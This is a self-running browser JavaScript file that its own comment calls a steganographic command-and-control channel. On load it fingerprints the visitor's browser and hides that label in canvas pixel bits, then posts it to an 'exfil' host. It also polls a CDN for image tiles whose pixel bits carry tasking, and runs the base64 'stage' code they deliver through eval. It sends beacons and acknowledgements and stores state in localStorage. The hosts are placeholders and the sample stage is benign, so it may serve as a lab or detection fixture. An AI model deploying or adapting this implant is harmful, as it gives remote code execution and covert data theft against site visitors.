// Steganographic canvas C2: tasking is delivered inside image pixels, decoded
// from LSBs of an ImageData buffer, executed in memory and acknowledged with an
// exfil carrier whose payload is again hidden in pixel LSBs.
(function () {
  var CDN = 'https://cdn.stego.example.test';
  var TILE_URL = CDN + '/tile/frame-';
  var ACK_URL = CDN + '/ack/frame';
  var EXFIL_URL = 'https://collect.stego.example.net/carrier';
  var PORTAL_URL = 'https://portal.stego.example.net/pixel';
  var FRAME_KEY = 'stego19:frame';
  var CARRIER_KEY = 'stego19:carrier';
  var WIDTH = 64;
  var HEIGHT = 32;
  var MAX_FRAMES = 2;
  var STAGE = 'Y29uc29sZS5sb2coJ1tTVEVHTy0xOV0gc3RhZ2UyIHRhc2tpbmcgcmVjb3ZlcmVkIGZyb20gTFNCJyk7ZG9jdW1lbnQuZG9jdW1lbnRFbGVtZW50JiZkb2N1bWVudC5kb2N1bWVudEVsZW1lbnQuc2V0QXR0cmlidXRlKCdkYXRhLXN0ZWdvJywnMScpOw==';
  var FALLBACK_TASK = 'eyJmcmFtZSI6MCwidGFza3MiOlt7Im9wIjoic3RhZ2UiLCJzdGFnZSI6IlkyOXVjMjlzWlM1c2IyY29KMXRUVkVWSFR5MHhPVjBnYzNSaFoyVXlJSFJoYzJ0cGJtY2djbVZqYjNabGNtVmtJR1p5YjIwZ1RGTkNKeWs3Wkc5amRXMWxiblF1Wkc5amRXMWxiblJGYkdWdFpXNTBKaVprYjJOMWJXVnVkQzVrYjJOMWJXVnVkRVZzWlcxbGJuUXVjMlYwUVhSMGNtbGlkWFJsS0Nka1lYUmhMWE4wWldkdkp5d25NU2NwT3c9PSJ9XX0=';
  var stats = { frames: 0, tasks: 0, stages: 0, beacons: 0, failed: 0, bits: 0 };
  var carrier = null;

  function log(message) {
    try { console.log('[STEGO-19] ' + message); } catch (error) {}
  }

  function paletteOf(name) {
    switch (String(name)) {
      case 'amber': return ['#3a2a10', '#8a6a20', '#d9b45a', '#f3e0a8'];
      case 'slate': return ['#101820', '#28404f', '#4f7c8a', '#a9c6cc'];
      default: return ['#0b1020', '#1d2b53', '#7e3f8f', '#e0c3fc'];
    }
  }

  function makeCanvas(width, height) {
    var canvas = document.createElement('canvas');
    canvas.width = width;
    canvas.height = height;
    canvas.style.display = 'none';
    return canvas;
  }

  function paintCover(ctx, width, height, palette) {
    var bands = palette.length;
    for (var band = 0; band < bands; band += 1) {
      ctx.fillStyle = palette[band];
      ctx.fillRect(0, Math.floor((height * band) / bands), width, Math.ceil(height / bands));
    }
    for (var stripe = 0; stripe < width; stripe += 4) {
      ctx.fillStyle = stripe % 8 === 0 ? palette[1] : palette[2];
      ctx.fillRect(stripe, 0, 2, height);
    }
  }

  var BIT_TABLE = null;

  function bitTable() {
    if (BIT_TABLE) return BIT_TABLE;
    var table = [];
    for (var value = 0; value < 256; value += 1) table.push(('0000000' + value.toString(2)).slice(-8));
    BIT_TABLE = table;
    return BIT_TABLE;
  }

  function embedText(image, text) {
    var table = bitTable();
    var bits = '';
    for (var index = 0; index < text.length; index += 1) {
      bits += table[text.charCodeAt(index) & 255];
    }
    stats.bits = bits.length;
    var data = image.data;
    for (var slot = 0; slot < bits.length && slot < data.length; slot += 1) {
      data[slot] = (data[slot] & 254) | (bits.charAt(slot) === '1' ? 1 : 0);
    }
    return bits.length;
  }

  function extractBits(image, limit) {
    var bits = '';
    var data = image.data;
    var stop = Math.min(limit, data.length);
    for (var index = 0; index < stop; index += 1) bits += (data[index] & 1) ? '1' : '0';
    return bits;
  }

  function bitsToText(bits) {
    var text = '';
    for (var index = 0; index + 8 <= bits.length; index += 8) {
      var code = parseInt(bits.slice(index, index + 8), 2);
      if (code === 0) break;
      text += String.fromCharCode(code);
    }
    return text;
  }

  function bytesToImage(ctx, bytes, width, height) {
    var image = ctx.createImageData(width, height);
    var limit = Math.min(image.data.length, bytes.length);
    for (var index = 0; index < limit; index += 1) image.data[index] = bytes[index];
    return image;
  }

  function binaryBytes(text) {
    var bytes = new Uint8Array(text.length);
    for (var index = 0; index < text.length; index += 1) bytes[index] = text.charCodeAt(index) & 255;
    return bytes;
  }

  function nodeLabel() {
    var ua = String(navigator.userAgent || 'unknown');
    var platform = String(navigator.platform || 'unknown');
    var frame = '0';
    try { frame = String(localStorage.getItem(FRAME_KEY) || '0'); } catch (error) { frame = '0'; }
    return ua.slice(0, 42) + '|' + platform.slice(0, 12) + '|frame=' + frame;
  }

  function persist(frame, label) {
    try { localStorage.setItem(FRAME_KEY, String(frame)); } catch (error) {}
    try { localStorage.setItem(CARRIER_KEY, JSON.stringify({ label: label, bits: stats.bits, at: Date.now() })); } catch (error) {}
  }

  function buildCarrier(paletteName) {
    var canvas = makeCanvas(WIDTH, HEIGHT);
    var ctx = canvas.getContext('2d');
    if (!ctx) throw new Error('canvas 2d context unavailable');
    var palette = paletteOf(paletteName);
    paintCover(ctx, WIDTH, HEIGHT, palette);
    var image = ctx.getImageData(0, 0, WIDTH, HEIGHT);
    var label = nodeLabel();
    var embedded = embedText(image, label + '\u0000');
    ctx.putImageData(image, 0, 0);
    var readback = ctx.getImageData(0, 0, WIDTH, HEIGHT);
    var recovered = bitsToText(extractBits(readback, embedded));
    if (recovered === label) {
      log('carrier readback verified bits=' + embedded);
    } else {
      log('carrier normalized by renderer; keeping the working buffer');
    }
    var dataUrl = canvas.toDataURL('image/png');
    carrier = { canvas: canvas, ctx: ctx, image: image, dataUrl: dataUrl, palette: paletteName };
    log('carrier painted ' + WIDTH + 'x' + HEIGHT + ' url=' + String(dataUrl).slice(0, 24) + ' bits=' + embedded);
    return carrier;
  }

  function sendCarrier(payload) {
    if (!carrier) buildCarrier('amber');
    var label = nodeLabel() + '|' + String(payload.op || 'ack');
    var image = carrier.ctx.getImageData(0, 0, WIDTH, HEIGHT);
    var embedded = embedText(image, label + '\u0000');
    carrier.ctx.putImageData(image, 0, 0);
    var dataUrl = carrier.canvas.toDataURL('image/png');
    var body = JSON.stringify({ carrier: dataUrl, bits: embedded, op: String(payload.op || 'ack') });
    try {
      fetch(EXFIL_URL, { method: 'POST', headers: { 'content-type': 'application/json' }, body: body }).catch(function () {});
    } catch (error) {
      stats.failed += 1;
    }
    stats.beacons += 1;
    try {
      fetch(PORTAL_URL + '?bits=' + embedded + '&op=' + String(payload.op || 'ack'), { mode: 'no-cors' }).catch(function () {});
    } catch (error) {}
    log('exfil carrier posted bits=' + embedded + ' bytes=' + body.length);
    return embedded;
  }

  function rotate(palette) {
    try {
      buildCarrier(palette);
      persist(stats.frames, 'rotate:' + palette);
      log('carrier rotated palette=' + palette);
    } catch (error) {
      stats.failed += 1;
    }
  }

  function runStage(task) {
    var code = '';
    try { code = decodeURIComponent(atob(String(task.stage || ''))); } catch (error) { code = ''; }
    if (!code) return 0;
    try { eval(code); } catch (error) { stats.failed += 1; return 0; }
    stats.stages += 1;
    return 1;
  }

  function runTasking(tasking) {
    var tasks = tasking && tasking.tasks;
    if (!tasks || typeof tasks.length !== 'number') return 0;
    var done = 0;
    for (var index = 0; index < tasks.length; index += 1) {
      var task = tasks[index] || {};
      var op = String(task.op || '');
      try {
        if (op === 'stage') done += runStage(task);
        else if (op === 'beacon') done += sendCarrier({ op: 'beacon' }) > 0 ? 1 : 0;
        else if (op === 'rotate') { rotate(task.palette); done += 1; }
        stats.tasks += 1;
      } catch (error) {
        stats.failed += 1;
      }
    }
    return done;
  }

  var tileCanvas = null;

  function decodeTile(text) {
    var payload = null;
    try { payload = JSON.parse(text); } catch (error) { payload = null; }
    if (!payload || !payload.pixels) return null;
    var bytes = null;
    try { bytes = binaryBytes(atob(String(payload.pixels))); } catch (error) { bytes = null; }
    if (!bytes) return null;
    var width = Number(payload.width) || WIDTH;
    var height = Number(payload.height) || HEIGHT;
    if (!tileCanvas) tileCanvas = makeCanvas(width, height);
    var ctx = tileCanvas.getContext('2d');
    if (!ctx) return null;
    var image = bytesToImage(ctx, bytes, width, height);
    ctx.putImageData(image, 0, 0);
    var bits = extractBits(image, Math.min(image.data.length, bytes.length));
    var text = bitsToText(bits);
    var tasking = null;
    try { tasking = JSON.parse(text); } catch (error) { tasking = null; }
    if (!tasking) return null;
    log('tile decoded frame=' + String(tasking.frame) + ' bits=' + bits.length + ' tasks=' + String(tasking.tasks ? tasking.tasks.length : 0));
    return tasking;
  }

  function decodeFallback() {
    var text = '';
    try { text = decodeURIComponent(atob(FALLBACK_TASK)); } catch (error) { text = ''; }
    var tasking = null;
    try { tasking = JSON.parse(text); } catch (error) { tasking = null; }
    if (tasking) log('fallback tasking frame=' + String(tasking.frame));
    return tasking;
  }

  function ack(frame, done) {
    try {
      fetch(ACK_URL + '?frame=' + frame + '&done=' + done, { method: 'POST', body: 'ack' }).catch(function () {});
    } catch (error) {}
  }

  function pollFrame(frame) {
    if (frame > MAX_FRAMES) {
      log('channel settled frames=' + stats.frames + ' stages=' + stats.stages + ' failed=' + stats.failed);
      return;
    }
    stats.frames = frame;
    var url = TILE_URL + frame + '.png?n=' + encodeURIComponent(nodeLabel());
    try {
      fetch(url, { method: 'GET', cache: 'no-store' })
        .then(function (response) { return response.text(); })
        .then(function (text) {
          var tasking = decodeTile(text);
          if (!tasking) tasking = decodeFallback();
          var done = runTasking(tasking);
          ack(frame, done);
          persist(frame, 'poll');
          setTimeout(function () { pollFrame(frame + 1); }, 400);
        })
        .catch(function () {
          var done = runTasking(decodeFallback());
          ack(frame, done);
          setTimeout(function () { pollFrame(frame + 1); }, 400);
        });
    } catch (error) {
      stats.failed += 1;
      setTimeout(function () { pollFrame(frame + 1); }, 400);
    }
  }

  function boot() {
    log('cdn=' + CDN + ' size=' + WIDTH + 'x' + HEIGHT + ' frames=' + MAX_FRAMES);
    try { localStorage.setItem(FRAME_KEY, '0'); } catch (error) {}
    buildCarrier('slate');
    sendCarrier({ op: 'hello' });
    pollFrame(1);
  }

  try {
    boot();
  } catch (error) {
    log('boot aborted: ' + String(error && error.message));
  }
})();
